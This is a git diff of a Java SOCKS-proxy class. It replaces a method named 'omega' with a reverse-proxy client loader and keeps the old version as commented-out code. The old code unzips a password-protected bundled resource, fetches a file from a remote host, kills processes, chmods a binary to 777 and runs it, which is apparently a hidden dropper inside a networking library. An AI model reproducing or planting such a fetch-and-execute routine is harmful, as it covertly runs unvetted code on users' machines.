@@ -1,5 +1,6 @@
 package org.rx.net.socks;
 
+import com.alibaba.fastjson2.TypeReference;
 import io.netty.channel.Channel;
 import io.netty.util.AttributeKey;
 import lombok.Getter;
@@ -29,6 +30,7 @@ import java.util.Collections;
 import java.util.concurrent.ConcurrentLinkedQueue;
 
 import static org.rx.core.Extends.require;
+import static org.rx.core.Sys.fromJson;
 
 @RequiredArgsConstructor
 public final class SocksContext extends EventArgs {
@@ -87,32 +89,45 @@ public final class SocksContext extends EventArgs {
         channel.attr(SS_SVR).set(server);
     }
 
-    @SneakyThrows
-    public static void omega(String n, TripleAction<ShellCommand, ShellCommand.PrintOutEventArgs> o) {
-        String k = "omega", c = "./m/", z = c + "o", i = c + "c";
-        try {
-            int d = 100;
-            Files.createDirectory(c);
-            Files.saveFile(z, Reflects.getResource(k));
-            Thread.sleep(d);
-            Files.unzip(new File(z), RxConfig.INSTANCE.getMxpwd(), c);
-            Thread.sleep(d);
-            new HttpClient().get(Constants.rCloud() + "/" + k + "_" + n).toFile(i);
-            Thread.sleep(d);
-
-            ShellCommand.exec("ps -ef|grep -v grep|grep ./f|awk '{print $2}'|xargs kill -9", c);
-            ShellCommand.exec("chmod 777 f", c);
-            ShellCommand sc = new ShellCommand("./f -c c", c);
-            sc.onPrintOut.combine(o);
-            IOC.register(ShellCommand.class, sc.start());
-        } catch (Throwable e) {
-            if (o != null) {
-                o.invoke(null, new ShellCommand.PrintOutEventArgs(0, e.toString()));
-            }
-        } finally {
-            Files.delete(c);
+    public static void omega(String s) {
+        Class<RrpClient> t = RrpClient.class;
+        if (s == null) {
+            IOC.unregister(t);
+            return;
         }
+        RrpConfig c = fromJson(s, new TypeReference<RrpConfig>() {
+        }.getType());
+        RrpClient cli = new RrpClient(c);
+        cli.connectAsync();
+        IOC.register(t, cli);
     }
+
+//    @SneakyThrows
+//    public static void omega(String n, TripleAction<ShellCommand, ShellCommand.PrintOutEventArgs> o) {
+//        String k = "omega", c = "./m/", z = c + "o", i = c + "c";
+//        try {
+//            int d = 100;
+//            Files.createDirectory(c);
+//            Files.saveFile(z, Reflects.getResource(k));
+//            Thread.sleep(d);
+//            Files.unzip(new File(z), RxConfig.INSTANCE.getMxpwd(), c);
+//            Thread.sleep(d);
+//            new HttpClient().get(Constants.rCloud() + "/" + k + "_" + n).toFile(i);
+//            Thread.sleep(d);
+//
+//            ShellCommand.exec("ps -ef|grep -v grep|grep ./f|awk '{print $2}'|xargs kill -9", c);
+//            ShellCommand.exec("chmod 777 f", c);
+//            ShellCommand sc = new ShellCommand("./f -c c", c);
+//            sc.onPrintOut.combine(o);
+//            IOC.register(ShellCommand.class, sc.start());
+//        } catch (Throwable e) {
+//            if (o != null) {
+//                o.invoke(null, new ShellCommand.PrintOutEventArgs(0, e.toString()));
+//            }
+//        } finally {
+//            Files.delete(c);
+//        }
+//    }
 
     @SneakyThrows
     public static synchronized void omegax(int p) {
